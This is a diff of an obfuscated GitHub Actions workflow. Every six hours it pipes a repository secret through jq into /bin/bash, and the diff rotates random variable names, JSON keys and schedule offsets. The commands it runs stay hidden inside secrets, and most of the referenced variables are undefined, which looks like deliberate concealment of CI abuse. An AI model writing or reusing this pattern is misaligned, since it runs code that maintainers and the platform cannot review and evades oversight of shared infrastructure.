@@ -1,24 +1,24 @@
 name: danchaofancfcf
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 0/6 * * *'
+    - cron: '9 2/6 * * *'
 
-jobs:  # 26313
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: danchaofancfcf
         env:
-          haho4951: ${{ secrets.haho4951 }}
+          c640: ${{ secrets.c640 }}
         run: |
-          echo $haho4951 | jq -r .hydb19489 | /bin/bash
-          echo $vo39372 | jq -r .lpx78 | /bin/bash
-          echo $z302 | jq -r .rkf864 | /bin/bash
-          echo $zjgsr31 | jq -r .shj0 | /bin/bash
-          echo $ztcm3577 | jq -r .vrdsm6 | /bin/bash
-          echo $tq252 | jq -r .ozmtm6 | /bin/bash
-          echo $eknnw58283 | jq -r .rzvbt2 | /bin/bash
+          echo $c640 | jq -r .wa846 | /bin/bash
+          echo $z327 | jq -r .qg24 | /bin/bash
+          echo $n076 | jq -r .r8173 | /bin/bash
+          echo $jxktv028 | jq -r .zuj2 | /bin/bash
+          echo $swis7 | jq -r .ue70 | /bin/bash
+          echo $xb67743 | jq -r .qyb3 | /bin/bash
+          echo $g1 | jq -r .iewlq49594 | /bin/bash
 
